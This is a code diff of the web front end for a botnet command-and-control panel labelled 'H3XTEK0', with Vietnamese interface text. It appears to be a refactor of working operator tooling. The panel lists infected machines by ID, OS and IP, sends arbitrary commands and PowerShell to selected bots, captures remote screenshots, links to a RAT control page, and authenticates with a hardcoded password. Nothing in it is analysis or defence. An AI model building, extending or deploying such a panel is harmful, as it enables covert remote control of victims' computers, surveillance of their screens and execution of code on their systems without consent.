@@ -4,21 +4,19 @@
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
     <title>C2 Botnet - H3XTEK0</title>
-    <link rel="stylesheet" href="/style.css">
     <style>
-        /* ===== DASHBOARD SPECIFIC ===== */
-        .container { max-width: 1440px; margin: 0 auto; padding: 20px; }
+        * { margin: 0; padding: 0; box-sizing: border-box; }
+        body { background: #0a0a0f; color: #fff; font-family: 'Segoe UI', sans-serif; padding: 20px; }
+        .container { max-width: 1440px; margin: 0 auto; }
         .header { display: flex; justify-content: space-between; align-items: center; padding: 16px 24px; margin-bottom: 24px; flex-wrap: wrap; gap: 12px; background: rgba(20, 10, 15, 0.7); backdrop-filter: blur(12px); border: 1px solid rgba(255, 0, 51, 0.25); border-radius: 16px; }
         .header h1 { font-size: 24px; font-weight: 800; background: linear-gradient(135deg, #ff0033, #ff6688); -webkit-background-clip: text; -webkit-text-fill-color: transparent; }
         .header h1 .sub { font-size: 12px; font-weight: 400; -webkit-text-fill-color: rgba(255,255,255,0.4); display: block; }
-        .password-badge { background: rgba(255, 0, 51, 0.2); border: 1px solid rgba(255, 0, 51, 0.3); padding: 6px 16px; border-radius: 20px; font-size: 12px; color: #ff6677; font-family: monospace; letter-spacing: 1px; }
-
+        .password-badge { background: rgba(255, 0, 51, 0.2); border: 1px solid rgba(255, 0, 51, 0.3); padding: 6px 16px; border-radius: 20px; font-size: 12px; color: #ff6677; font-family: monospace; }
         .stats { display: grid; grid-template-columns: repeat(4, 1fr); gap: 16px; margin-bottom: 24px; }
-        .stat-card { padding: 20px; text-align: center; background: rgba(20, 10, 15, 0.7); backdrop-filter: blur(12px); border: 1px solid rgba(255, 0, 51, 0.25); border-radius: 16px; box-shadow: 0 8px 32px rgba(0,0,0,0.5); transition: all 0.3s; }
+        .stat-card { padding: 20px; text-align: center; background: rgba(20, 10, 15, 0.7); backdrop-filter: blur(12px); border: 1px solid rgba(255, 0, 51, 0.25); border-radius: 16px; transition: all 0.3s; }
         .stat-card:hover { transform: translateY(-4px); box-shadow: 0 0 40px rgba(255, 0, 51, 0.3); }
         .stat-number { font-size: 32px; font-weight: 700; background: linear-gradient(135deg, #ff0033, #ff6688); -webkit-background-clip: text; -webkit-text-fill-color: transparent; }
         .stat-label { font-size: 13px; color: rgba(255,255,255,0.5); margin-top: 4px; text-transform: uppercase; letter-spacing: 1px; }
-
         .action-bar { display: flex; gap: 12px; flex-wrap: wrap; margin-bottom: 20px; }
         .btn { display: inline-flex; align-items: center; justify-content: center; gap: 8px; padding: 10px 24px; border: none; border-radius: 10px; font-weight: 600; font-size: 14px; cursor: pointer; transition: all 0.3s; text-decoration: none; text-transform: uppercase; letter-spacing: 0.5px; }
         .btn-primary { background: linear-gradient(135deg, #ff0033, #cc0028); color: #fff; box-shadow: 0 0 25px rgba(255, 0, 51, 0.4); }
@@ -26,16 +24,12 @@
         .btn-outline { background: transparent; color: #ff0033; border: 1.5px solid #ff0033; }
         .btn-outline:hover { background: rgba(255, 0, 51, 0.15); box-shadow: 0 0 25px rgba(255, 0, 51, 0.2); }
         .btn-danger { background: linear-gradient(135deg, #cc0033, #880022); color: #fff; }
-        .btn-danger:hover { transform: translateY(-2px); box-shadow: 0 0 35px rgba(255, 0, 51, 0.4); }
         .btn-rat { background: linear-gradient(135deg, #ff0033, #cc0028); color: #fff; padding: 12px 30px; border-radius: 12px; font-weight: 700; font-size: 15px; box-shadow: 0 0 35px rgba(255, 0, 51, 0.35); text-decoration: none; display: inline-flex; align-items: center; gap: 10px; transition: all 0.3s; }
         .btn-rat:hover { transform: translateY(-3px); box-shadow: 0 0 55px rgba(255, 0, 51, 0.5); }
         .btn-small { padding: 4px 12px; font-size: 11px; border-radius: 6px; }
-
         .input-glass { background: rgba(255,255,255,0.05); border: 1.5px solid rgba(255, 0, 51, 0.2); border-radius: 10px; padding: 12px 16px; color: #fff; font-size: 14px; transition: all 0.3s; width: 100%; }
         .input-glass::placeholder { color: rgba(255,255,255,0.35); }
         .input-glass:focus { outline: none; border-color: #ff0033; box-shadow: 0 0 25px rgba(255, 0, 51, 0.3); }
-
-        /* === COMMAND BOX === */
         .cmd-box { display: flex; gap: 10px; flex-wrap: wrap; padding: 16px 20px; margin-bottom: 20px; align-items: center; background: rgba(20, 10, 15, 0.7); backdrop-filter: blur(12px); border: 1px solid rgba(255, 0, 51, 0.25); border-radius: 16px; }
         .cmd-box input { flex: 1; min-width: 100px; }
         .cmd-box input:first-child { flex: 0.6; min-width: 80px; }
@@ -44,8 +38,6 @@
         .cmd-box .result-box .ok { color: #00ff88; }
         .cmd-box .result-box .pending { color: #ffaa00; }
         .cmd-box .result-box .error { color: #ff0044; }
-
-        /* === BOT TABLE === */
         .table-wrap { background: rgba(20, 10, 15, 0.7); backdrop-filter: blur(12px); border: 1px solid rgba(255, 0, 51, 0.25); border-radius: 16px; overflow-x: auto; padding: 4px 0; }
         table { width: 100%; border-collapse: collapse; font-size: 13px; }
         table thead { background: rgba(255, 0, 51, 0.08); }
@@ -54,8 +46,6 @@
         table tr:hover td { background: rgba(255, 0, 51, 0.04); }
         .online { color: #00ff88; }
         .offline { color: #ff4444; }
-
-        /* === MODAL === */
         .modal { display: none; position: fixed; inset: 0; background: rgba(0,0,0,0.85); backdrop-filter: blur(8px); z-index: 1000; align-items: center; justify-content: center; padding: 20px; }
         .modal.active { display: flex; }
         .modal-content { max-width: 700px; width: 100%; max-height: 85vh; padding: 28px; overflow-y: auto; position: relative; background: rgba(20, 10, 15, 0.9); backdrop-filter: blur(12px); border: 1px solid rgba(255, 0, 51, 0.25); border-radius: 16px; box-shadow: 0 0 60px rgba(255, 0, 51, 0.15); }
@@ -70,13 +60,9 @@
         .btn-close-modal:hover { background: rgba(255,255,255,0.2); }
         .btn-download { background: #00ff88; color: #0a0a0f; }
         .btn-download:hover { background: #00dd77; }
-
-        /* === PS COMMAND MODAL === */
         .ps-input-group { display: flex; gap: 10px; margin-top: 10px; flex-wrap: wrap; }
         .ps-input-group input { flex: 1; min-width: 150px; }
         .ps-input-group button { padding: 10px 24px; }
-
-        /* === RESPONSIVE === */
         @media (max-width: 768px) {
             .container { padding: 12px; }
             .header h1 { font-size: 18px; }
@@ -90,7 +76,6 @@
             table th, table td { padding: 6px 8px; }
             .modal-content { margin: 10px; padding: 16px; max-width: 95%; }
             .modal-content .screenshot-img { max-height: 40vh; }
-            .action-bar { gap: 8px; }
             .btn { padding: 8px 16px; font-size: 12px; }
             .btn-rat { padding: 10px 20px; font-size: 13px; }
         }
@@ -108,13 +93,11 @@
 </head>
 <body>
     <div class="container">
-        <!-- HEADER -->
         <div class="header">
             <h1>⚡ H3XTEK0<span class="sub">C2 Botnet Control</span></h1>
             <div class="password-badge">🔑 H3XTEK0</div>
         </div>
 
-        <!-- STATS -->
         <div class="stats">
             <div class="stat-card"><div class="stat-number" id="totalBots">0</div><div class="stat-label">Tổng Bot</div></div>
             <div class="stat-card"><div class="stat-number" id="onlineBots">0</div><div class="stat-label">Online</div></div>
@@ -122,14 +105,12 @@
             <div class="stat-card"><div class="stat-number" id="groupsCount">0</div><div class="stat-label">Groups</div></div>
         </div>
 
-        <!-- ACTION BAR -->
         <div class="action-bar">
             <a href="/rat" class="btn-rat">🎯 RAT Control</a>
             <button onclick="viewDB()" class="btn btn-outline">📊 Database</button>
             <button onclick="clearAllData()" class="btn btn-danger">🗑️ Xóa DB</button>
         </div>
 
-        <!-- COMMAND BOX -->
         <div class="cmd-box">
             <input type="text" id="botIdInput" class="input-glass" placeholder="Bot ID">
             <input type="text" id="cmdInput" class="input-glass" placeholder="Lệnh (ps, sc, ping...)" style="flex:2;">
@@ -138,86 +119,30 @@
             <div class="result-box" id="cmdResultDisplay">⏳ Chưa có kết quả</div>
         </div>
 
-        <!-- BOTS TABLE -->
         <div class="table-wrap">
             <table>
-                <thead><tr>
-                    <th>Bot ID</th><th>Group</th><th>Version</th><th>OS</th><th>IP</th><th>Last Seen</th><th>Status</th><th>Actions</th>
-                </tr></thead>
+                <thead><tr><th>Bot ID</th><th>Group</th><th>Version</th><th>OS</th><th>IP</th><th>Last Seen</th><th>Status</th><th>Actions</th></tr></thead>
                 <tbody id="botsTable"></tbody>
             </table>
         </div>
     </div>
 
-    <!-- MODAL: DATABASE -->
-    <div id="dbModal" class="modal">
-        <div class="modal-content">
-            <span class="close" onclick="closeModal('dbModal')">&times;</span>
-            <h3>📊 Toàn bộ Database</h3>
-            <pre id="dbContent">Đang tải...</pre>
-        </div>
-    </div>
-
-    <!-- MODAL: KẾT QUẢ LỆNH (PS, PING, ...) -->
-    <div id="resultModal" class="modal">
-        <div class="modal-content">
-            <span class="close" onclick="closeModal('resultModal')">&times;</span>
-            <h3 id="resultModalTitle">📋 Kết quả lệnh</h3>
-            <pre id="resultContent">Đang tải...</pre>
-        </div>
-    </div>
-
-    <!-- MODAL: SCREENSHOT (SC) -->
-    <div id="screenshotModal" class="modal">
-        <div class="modal-content">
-            <span class="close" onclick="closeModal('screenshotModal')">&times;</span>
-            <h3>🖼️ Screenshot</h3>
-            <img id="screenshotImage" class="screenshot-img" src="" alt="Screenshot">
-            <div class="screenshot-actions">
-                <button class="btn-close-modal" onclick="closeModal('screenshotModal')">Đóng</button>
-                <button class="btn-download" onclick="downloadScreenshot()">⬇️ Tải ảnh</button>
-                <button class="btn btn-primary" onclick="refreshScreenshot()">🔄 Chụp lại</button>
-            </div>
-        </div>
-    </div>
-
-    <!-- MODAL: PS COMMAND -->
-    <div id="psModal" class="modal">
-        <div class="modal-content">
-            <span class="close" onclick="closeModal('psModal')">&times;</span>
-            <h3>💻 PowerShell Command</h3>
-            <p style="color:#888;font-size:13px;margin-bottom:12px;">Nhập lệnh PowerShell để thực thi trên bot</p>
-            <input type="text" id="psCommandInput" class="input-glass" placeholder="Ví dụ: Get-Process" style="width:100%;">
-            <div class="ps-input-group">
-                <input type="text" id="psBotIdInput" class="input-glass" placeholder="Bot ID" style="flex:0.6;">
-                <button onclick="sendPsCommand()" class="btn btn-primary" style="flex:1;">⚡ Thực thi</button>
-            </div>
-        </div>
-    </div>
+    <!-- MODALS -->
+    <div id="dbModal" class="modal"><div class="modal-content"><span class="close" onclick="closeModal('dbModal')">&times;</span><h3>📊 Toàn bộ Database</h3><pre id="dbContent">Đang tải...</pre></div></div>
+    <div id="resultModal" class="modal"><div class="modal-content"><span class="close" onclick="closeModal('resultModal')">&times;</span><h3 id="resultModalTitle">📋 Kết quả lệnh</h3><pre id="resultContent">Đang tải...</pre></div></div>
+    <div id="screenshotModal" class="modal"><div class="modal-content"><span class="close" onclick="closeModal('screenshotModal')">&times;</span><h3>🖼️ Screenshot</h3><img id="screenshotImage" class="screenshot-img" src="" alt="Screenshot"><div class="screenshot-actions"><button class="btn-close-modal" onclick="closeModal('screenshotModal')">Đóng</button><button class="btn-download" onclick="downloadScreenshot()">⬇️ Tải</button><button class="btn btn-primary" onclick="refreshScreenshot()">🔄 Chụp lại</button></div></div></div>
+    <div id="psModal" class="modal"><div class="modal-content"><span class="close" onclick="closeModal('psModal')">&times;</span><h3>💻 PowerShell</h3><p style="color:#888;font-size:13px;margin-bottom:12px;">Nhập lệnh PowerShell</p><input type="text" id="psCommandInput" class="input-glass" placeholder="Ví dụ: Get-Process" style="width:100%;"><div class="ps-input-group"><input type="text" id="psBotIdInput" class="input-glass" placeholder="Bot ID" style="flex:0.6;"><button onclick="sendPsCommand()" class="btn btn-primary" style="flex:1;">⚡ Thực thi</button></div></div></div>
 
     <script>
         const API_PASSWORD = 'H3XTEK0';
         let botsData = [];
-        let currentPollingInterval = null;
-        let currentPollingCmdId = null;
+        let pollingInterval = null;
         let lastScreenshotData = null;
 
-        function getAuth() {
-            return { 'Authorization': `Bearer ${API_PASSWORD}` };
-        }
+        function getAuth() { return { 'Authorization': `Bearer ${API_PASSWORD}` }; }
+        function closeModal(id) { document.getElementById(id).classList.remove('active'); document.getElementById(id).style.display = 'none'; }
+        function openModal(id) { const el = document.getElementById(id); el.style.display = 'flex'; setTimeout(() => el.classList.add('active'), 10); }
 
-        function closeModal(id) {
-            document.getElementById(id).classList.remove('active');
-            document.getElementById(id).style.display = 'none';
-        }
-
-        function openModal(id) {
-            const el = document.getElementById(id);
-            el.style.display = 'flex';
-            setTimeout(() => el.classList.add('active'), 10);
-        }
-
-        // --- FETCH BOTS ---
         async function fetchBots() {
             try {
                 const res = await fetch('/api/bots', { headers: getAuth() });
@@ -237,8 +162,6 @@
             }
             data.forEach(b => {
                 const tr = document.createElement('tr');
-                const statusClass = b.online ? 'online' : 'offline';
-                const statusText = b.online ? '🟢 Online' : '🔴 Offline';
                 tr.innerHTML = `
                     <td><strong>${b.bot_id.slice(0, 8)}...</strong></td>
                     <td>${b.group_name || 'default'}</td>
@@ -246,7 +169,7 @@
                     <td>${b.os || 'Unknown'}</td>
                     <td>${b.ip || 'N/A'}</td>
                     <td>${b.last_seen ? new Date(b.last_seen).toLocaleString() : 'N/A'}</td>
-                    <td class="${statusClass}">${statusText}</td>
+                    <td class="${b.online ? 'online' : 'offline'}">${b.online ? '🟢 Online' : '🔴 Offline'}</td>
                     <td style="display:flex;gap:4px;flex-wrap:wrap;">
                         <button class="btn btn-primary btn-small" onclick="selectBot('${b.bot_id}')">Chọn</button>
                         <button class="btn btn-outline btn-small" onclick="openPsModal('${b.bot_id}')">💻 PS</button>
@@ -259,21 +182,15 @@
         }
 
         function updateStats(data) {
-            const total = data.length;
-            const online = data.filter(b => b.online).length;
-            const offline = total - online;
-            const groups = new Set(data.map(b => b.group_name)).size;
+            const total = data.length, online = data.filter(b => b.online).length, offline = total - online, groups = new Set(data.map(b => b.group_name)).size;
             document.getElementById('totalBots').textContent = total;
             document.getElementById('onlineBots').textContent = online;
             document.getElementById('offlineBots').textContent = offline;
             document.getElementById('groupsCount').textContent = groups || 0;
         }
 
-        function selectBot(botId) {
-            document.getElementById('botIdInput').value = botId;
-        }
+        function selectBot(botId) { document.getElementById('botIdInput').value = botId; }
 
-        // --- DELETE BOT ---
         async function deleteBot(botId) {
             if (!confirm(`Xóa bot ${botId.slice(0,8)}...?`)) return;
             try {
@@ -283,34 +200,33 @@
         }
 
         // ============================================================
-        //  POLLING KẾT QUẢ - FIXED
+        //  POLLING - FIXED
         // ============================================================
-        function pollResult(cmdId, botId, isScreenshot = false) {
-            // Dừng polling cũ nếu có
-            if (currentPollingInterval) {
-                clearInterval(currentPollingInterval);
-                currentPollingInterval = null;
+        function startPolling(cmdId, isScreenshot = false) {
+            // Dừng polling cũ
+            if (pollingInterval) {
+                clearInterval(pollingInterval);
+                pollingInterval = null;
             }
-            
-            currentPollingCmdId = cmdId;
-            let attempts = 0;
-            const maxAttempts = 30; // 30 giây
 
-            currentPollingInterval = setInterval(async () => {
+            let attempts = 0;
+            const maxAttempts = 30;
+
+            pollingInterval = setInterval(async () => {
                 attempts++;
                 try {
                     const res = await fetch(`/api/results/${cmdId}`, { headers: getAuth() });
                     const data = await res.json();
-                    
-                    // Kiểm tra kết quả
+
+                    // Kiểm tra nếu có kết quả (status ok hoặc error)
                     if (data.status === 'ok' || data.status === 'error') {
-                        clearInterval(currentPollingInterval);
-                        currentPollingInterval = null;
-                        
+                        clearInterval(pollingInterval);
+                        pollingInterval = null;
+
                         const el = document.getElementById('cmdResultDisplay');
-                        
+
+                        // Xử lý ảnh screenshot
                         if (isScreenshot && data.result && data.result.startsWith('data:image')) {
-                            // SCREENSHOT
                             el.innerHTML = `<span class="ok">✅ Ảnh đã sẵn sàng</span>`;
                             lastScreenshotData = data.result;
                             document.getElementById('screenshotImage').src = data.result;
@@ -318,11 +234,14 @@
                             fetchBots();
                             return;
                         }
-                        
-                        if (data.result) {
-                            // KẾT QUẢ TEXT (PS, PING, ...)
+
+                        // Xử lý kết quả text (PS, Ping, ...)
+                        if (data.result !== null && data.result !== undefined) {
+                            // Hiển thị preview ngắn trên thanh kết quả
                             const preview = data.result.length > 60 ? data.result.substring(0, 60) + '...' : data.result;
                             el.innerHTML = `<span class="ok">✅ ${preview}</span>`;
+
+                            // Hiển thị đầy đủ trong modal
                             document.getElementById('resultModalTitle').textContent = '📋 Kết quả lệnh';
                             document.getElementById('resultContent').textContent = data.result;
                             openModal('resultModal');
@@ -332,17 +251,17 @@
                         fetchBots();
                         return;
                     }
-                    
-                    // Nếu vẫn pending
+
+                    // Nếu vẫn pending và hết thời gian
                     if (attempts >= maxAttempts) {
-                        clearInterval(currentPollingInterval);
-                        currentPollingInterval = null;
+                        clearInterval(pollingInterval);
+                        pollingInterval = null;
                         document.getElementById('cmdResultDisplay').innerHTML = `<span class="error">⏰ Hết thời gian chờ</span>`;
                     }
-                } catch(e) {
+                } catch (e) {
                     if (attempts >= maxAttempts) {
-                        clearInterval(currentPollingInterval);
-                        currentPollingInterval = null;
+                        clearInterval(pollingInterval);
+                        pollingInterval = null;
                         document.getElementById('cmdResultDisplay').innerHTML = `<span class="error">❌ Lỗi lấy kết quả</span>`;
                     }
                 }
@@ -350,7 +269,7 @@
         }
 
         // ============================================================
-        //  GỬI LỆNH CHUNG
+        //  SEND COMMAND
         // ============================================================
         async function sendCommand() {
             const botId = document.getElementById('botIdInput').value.trim();
@@ -360,7 +279,6 @@
             try { if (argsRaw) args = JSON.parse(argsRaw); } catch (e) { alert('Args phải là JSON array hợp lệ!'); return; }
             if (!command) { alert('Nhập lệnh đi!'); return; }
             if (!botId) { alert('Nhập Bot ID!'); return; }
-
             const bot = botsData.find(b => b.bot_id === botId);
             if (!bot) { alert('Bot ID không tồn tại!'); return; }
             if (!bot.online) { alert('Bot đang offline!'); return; }
@@ -376,13 +294,11 @@
 
             if (data.status === 'sent') {
                 const cmdId = data.cmd_id;
-                document.getElementById('cmdResultDisplay').textContent = `⏳ Đã gửi, đợi kết quả... (${cmdId.slice(-6)})`;
-                
-                // Xác định loại lệnh để polling đúng
+                document.getElementById('cmdResultDisplay').textContent = `⏳ Đã gửi, đợi... (${cmdId.slice(-6)})`;
                 const isScreenshot = (command === 'sc');
-                pollResult(cmdId, botId, isScreenshot);
+                startPolling(cmdId, isScreenshot);
             } else {
-                document.getElementById('cmdResultDisplay').innerHTML = `<span class="error">⚠️ ${data.status}: ${data.cmd_id}</span>`;
+                document.getElementById('cmdResultDisplay').innerHTML = `<span class="error">⚠️ ${data.status}</span>`;
             }
         }
 
@@ -407,7 +323,7 @@
             if (data.status === 'sent') {
                 const cmdId = data.cmd_id;
                 document.getElementById('cmdResultDisplay').textContent = `⏳ Đã gửi, đợi ảnh... (${cmdId.slice(-6)})`;
-                pollResult(cmdId, botId, true);
+                startPolling(cmdId, true);
             } else {
                 document.getElementById('cmdResultDisplay').innerHTML = `<span class="error">⚠️ ${data.status}</span>`;
             }
@@ -415,11 +331,8 @@
 
         function refreshScreenshot() {
             const botId = document.getElementById('botIdInput').value.trim();
-            if (botId) {
-                takeScreenshot(botId);
-            } else {
-                alert('Nhập Bot ID trước!');
-            }
+            if (botId) takeScreenshot(botId);
+            else alert('Nhập Bot ID trước!');
         }
 
         function downloadScreenshot() {
@@ -447,7 +360,6 @@
             const command = document.getElementById('psCommandInput').value.trim();
             if (!botId) { alert('Nhập Bot ID!'); return; }
             if (!command) { alert('Nhập lệnh PowerShell!'); return; }
-
             const bot = botsData.find(b => b.bot_id === botId);
             if (!bot) { alert('Bot không tồn tại!'); return; }
             if (!bot.online) { alert('Bot đang offline!'); return; }
@@ -464,24 +376,21 @@
 
             if (data.status === 'sent') {
                 const cmdId = data.cmd_id;
-                document.getElementById('cmdResultDisplay').textContent = `⏳ Đã gửi PS, đợi kết quả... (${cmdId.slice(-6)})`;
-                pollResult(cmdId, botId, false);
+                document.getElementById('cmdResultDisplay').textContent = `⏳ Đã gửi PS, đợi... (${cmdId.slice(-6)})`;
+                startPolling(cmdId, false);
             } else {
                 document.getElementById('cmdResultDisplay').innerHTML = `<span class="error">⚠️ ${data.status}</span>`;
             }
         }
 
-        // Enter key
         document.addEventListener('keydown', (e) => {
-            if (e.key === 'Enter') {
-                if (document.getElementById('psModal').classList.contains('active')) {
-                    sendPsCommand();
-                }
+            if (e.key === 'Enter' && document.getElementById('psModal').classList.contains('active')) {
+                sendPsCommand();
             }
         });
 
         // ============================================================
-        //  VIEW DB & CLEAR ALL
+        //  DB & CLEAR
         // ============================================================
         async function viewDB() {
             try {
@@ -501,11 +410,9 @@
             } catch (e) { alert('❌ Lỗi: ' + e.message); }
         }
 
-        // --- AUTO REFRESH ---
         setInterval(fetchBots, 5000);
         fetchBots();
 
-        // Click outside modal to close
         document.querySelectorAll('.modal').forEach(m => {
             m.addEventListener('click', (e) => {
                 if (e.target === m) {
@@ -515,7 +422,6 @@
             });
         });
 
-        // Expose functions to global
         window.openPsModal = openPsModal;
         window.takeScreenshot = takeScreenshot;
         window.sendCommand = sendCommand;
